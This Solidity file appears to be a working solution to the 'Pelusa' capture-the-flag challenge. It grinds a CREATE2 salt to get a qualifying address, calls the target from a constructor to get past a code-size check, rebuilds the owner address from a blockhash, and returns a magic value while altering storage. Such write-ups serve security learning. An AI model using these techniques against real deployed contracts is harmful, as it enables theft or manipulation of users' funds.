// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Pelusa, IGame } from "eko/ChallengePelusa.sol";

contract PelusaCracker {
  PelusaPlayer public immutable player;

  constructor(Pelusa pelusa, address deployer, uint256 deployBlock) {
    bytes32 codeHash = keccak256(
      abi.encodePacked(type(PelusaPlayer).creationCode, abi.encode(pelusa, deployer, deployBlock))
    );
    uint256 salt = 0;
    for (
      ;
      uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, codeHash)))) % 100 != 10;
      ++salt
    ) {}
    player = new PelusaPlayer{ salt: bytes32(salt) }(pelusa, deployer, deployBlock);
    pelusa.shoot();
  }
}

contract PelusaPlayer is IGame {
  address public immutable getBallPossesion;

  address internal gap;

  uint256 public goals;

  constructor(Pelusa pelusa, address deployer, uint256 deployBlock) {
    getBallPossesion = address(uint160(uint256(keccak256(abi.encodePacked(deployer, blockhash(deployBlock))))));
    pelusa.passTheBall();
  }

  function handOfGod() external returns (uint256) {
    goals++;
    return 22_06_1986;
  }
}
